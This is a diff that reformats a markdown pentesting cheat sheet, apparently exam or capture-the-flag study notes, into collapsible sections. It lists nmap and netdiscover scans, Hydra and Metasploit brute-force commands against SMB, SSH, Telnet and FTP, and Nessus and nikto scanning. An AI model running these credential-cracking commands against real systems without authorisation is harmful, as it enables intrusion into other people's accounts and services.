@@ -2,7 +2,7 @@
 
   
 <details>
-  <summary>Netdiscover</summary>]
+  <summary>Netdiscover</summary>
   
 ## Netdiscover 
   
@@ -13,10 +13,8 @@ netdiscover -r x.x.x.1/24
  </details> 
 
 <details>
-  <summary>Netdiscover</summary>
+  <summary>Nmap</summary>
   
-## Nmap
-
 ```console
 nmap -sP x.x.x.1/24                 
 nmap -sn x.x.x.1/24
@@ -25,16 +23,20 @@ nmap --script ftp-brute -p 21 <host>
 Nmap -Pn -p 3389 target > rdp  // grep -B 5 open rdp
 Nmap -Pn -p 3306 target > mysql // grep -B 5 open mysql
 ```
+</details>
 
 # SMB Credentials Cracking
 
-## SMB Cracking with Hydra
+<details>
+  <summary>SMB Cracking with Hydra</summary>
 
 ```console
 hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
 ```
+</details>
 
-## SMB Cracking with Metasploit
+<details>
+  <summary>SMB Cracking with Metasploit</summary>
 
 ```console
 For Cracking SMB Password:
@@ -47,14 +49,29 @@ we need to make folder -> store wordlist into that -> run msf from that folder |
 >set SMBUser name [of the user] | (generally Administrator is username)
 >run
 ```
+</details>
+
 # Bruteforce SSH, TELNET, FTP  
 
-## SSH
+<details>
+  <summary>SSH</summary>
+  
 ```console
 hydra -l username -P passlist.txt x.x.x.x ssh
+```
+</details>
+
+<details>
+  <summary>TELNET</summary>
+  
+```console
 hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
 ```
-## FTP
+</details>
+
+<details>
+  <summary>FTP</summary>
+  
 ```console
 hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x
 
@@ -64,18 +81,27 @@ hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
 • Used to download the specific file from FTP to attacker or local machine
 get flag.txt ~/Desktop/filepath/flag.txt
 ```
+</details>
+
 
 # Vulnerability Scanning 
 
-##  Nessus
+<details>
+  <summary>Nessus</summary>
+  
 ```console
 Nessus runs on https[:]//localhost[:]8834
 ```
+</details>
 
-##  nikto -h 
+<details>
+  <summary>Nikto</summary>
+  
 ```console
-
+nikto -h 
 ```
+</details>
+
 # Hidden text
 
 ## Snow
